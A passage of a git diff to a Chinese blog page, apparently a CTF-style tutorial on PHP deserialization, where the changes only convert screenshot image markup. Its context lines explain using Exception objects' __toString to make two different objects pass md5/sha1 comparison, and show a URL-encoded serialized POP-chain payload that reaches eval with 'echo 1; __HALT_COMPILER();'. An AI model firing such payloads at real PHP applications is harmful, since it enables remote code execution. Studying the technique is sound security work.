@@ -317,7 +317,7 @@ foreach ($classes as $class)
     if (in_array(&#39;__toString&#39;, get_class_methods($class)))
         echo $class.PHP_EOL;</code></pre>
 <p>仅展示部分，可以看到基本都是异常报错类，本文以<code>Exception</code>为例</p>
-<p>![截屏2020-08-13 下午9.50.20](学习反序列化中利用toString绕过md5和sha1/截屏2020-08-13 下午9.50.20.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%88%A9%E7%94%A8toString%E7%BB%95%E8%BF%87md5%E5%92%8Csha1/%E6%88%AA%E5%B1%8F2020-08-13%20%E4%B8%8B%E5%8D%889.50.20.png" alt="截屏2020-08-13 下午9.50.20"></p>
 <h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>先展示一个直观的PoC代码，再对其进行分析</p>
 <pre><code class="php">&lt;?php
 
@@ -365,7 +365,7 @@ echo urlencode($t1);
 <p>![截屏2020-08-14 上午9.44.43](学习反序列化中利用toString绕过md5和sha1/截屏2020-08-14 上午9.44.43.png)</p>
 <p>![截屏2020-08-14 上午9.49.37](学习反序列化中利用toString绕过md5和sha1/截屏2020-08-14 上午9.49.37.png)</p>
 <p><code>($evalcode,&quot;in &quot;)</code>和<code>($evalcode.&quot; in&quot;,&quot;&quot;)</code>必须要这么写，可以通过打印直观了解其原因</p>
-<p>![截屏2020-08-14 上午10.05.24](学习反序列化中利用toString绕过md5和sha1/截屏2020-08-14 上午10.05.24.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%88%A9%E7%94%A8toString%E7%BB%95%E8%BF%87md5%E5%92%8Csha1/%E6%88%AA%E5%B1%8F2020-08-14%20%E4%B8%8A%E5%8D%8810.05.24.png" alt="截屏2020-08-14 上午10.05.24"></p>
 <p><code>Exception</code>异常类作为字符串输出的结果</p>
 <pre><code class="php">Exception: echo 1; __HALT_COMPILER(); in in :37 👈 Exception: $mess in $file :$line
 Stack trace:
@@ -373,10 +373,10 @@ Stack trace:
 #1 {main}</code></pre>
 <p>这就刚好解释了为什么必须要控制<code>$file</code>，切忌都写成<code>($evalcode,&quot;in &quot;)</code>或<code>($evalcode.&quot; in&quot;,&quot;&quot;)</code>，这样<code>var1</code>和<code>var2</code>就都相等了</p>
 <p>在<code>$evalcode</code>中必须要用到<code>__HALT_COMPILER();</code>，其作用是<strong>让编译器执行到这之后就不再去解析后面的部分</strong>；如果不使用的话，在之后<code>eval()</code>中就会发生<code>Parse error</code></p>
-<p>![截屏2020-08-14 上午10.12.52](学习反序列化中利用toString绕过md5和sha1/截屏2020-08-14 上午10.12.52.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%88%A9%E7%94%A8toString%E7%BB%95%E8%BF%87md5%E5%92%8Csha1/%E6%88%AA%E5%B1%8F2020-08-14%20%E4%B8%8A%E5%8D%8810.12.52.png" alt="截屏2020-08-14 上午10.12.52"></p>
 <p>之后将PoC生产的POP链赋值给参数1即可</p>
 <pre><code>?1=O%3A8%3A&quot;Timeline&quot;%3A3%3A{s%3A4%3A&quot;var3&quot;%3BN%3Bs%3A4%3A&quot;var1&quot;%3BO%3A9%3A&quot;Exception&quot;%3A2%3A{s%3A10%3A&quot;%00*%00message&quot;%3Bs%3A26%3A&quot;echo+1%3B+__HALT_COMPILER()%3B&quot;%3Bs%3A7%3A&quot;%00*%00file&quot;%3Bs%3A3%3A&quot;in+&quot;%3B}s%3A4%3A&quot;var2&quot;%3BO%3A9%3A&quot;Exception&quot;%3A2%3A{s%3A10%3A&quot;%00*%00message&quot;%3Bs%3A29%3A&quot;echo+1%3B+__HALT_COMPILER()%3B+in&quot;%3Bs%3A7%3A&quot;%00*%00file&quot;%3Bs%3A0%3A&quot;&quot;%3B}}</code></pre>
-<p>![截屏2020-08-14 上午10.15.37](学习反序列化中利用toString绕过md5和sha1/截屏2020-08-14 上午10.15.37.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%88%A9%E7%94%A8toString%E7%BB%95%E8%BF%87md5%E5%92%8Csha1/%E6%88%AA%E5%B1%8F2020-08-14%20%E4%B8%8A%E5%8D%8810.15.37.png" alt="截屏2020-08-14 上午10.15.37"></p>
 <h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>这个方法比第一种灵活，构造PoC</p>
 <pre><code class="php">&lt;?php
 
@@ -398,7 +398,7 @@ $wtf-&gt;var2 = $ex2;
 
 echo urlencode(serialize($wtf));</code></pre>
 <p>有了上一个方法的学习，这种方法就很好理解</p>
-<p>![截屏2020-08-14 上午10.29.40](学习反序列化中利用toString绕过md5和sha1/截屏2020-08-14 上午10.29.40.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%88%A9%E7%94%A8toString%E7%BB%95%E8%BF%87md5%E5%92%8Csha1/%E6%88%AA%E5%B1%8F2020-08-14%20%E4%B8%8A%E5%8D%8810.29.40.png" alt="截屏2020-08-14 上午10.29.40"></p>
 <p>目前可能存有的疑问应该就是<code>?&gt;</code>的闭合标签，可以查看手册有一个清晰的认识</p>
 <blockquote>
 <p>代码不能包含打开/关闭 PHP tags。比如， <em>‘echo “Hi!”;’</em> 不能这样传入： ‘<?php echo "Hi!"; ?>‘。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 *’echo “In PHP mode!”; ?&gt;In HTML mode!&lt;?php echo “Back in PHP mode!”;’*。</p>
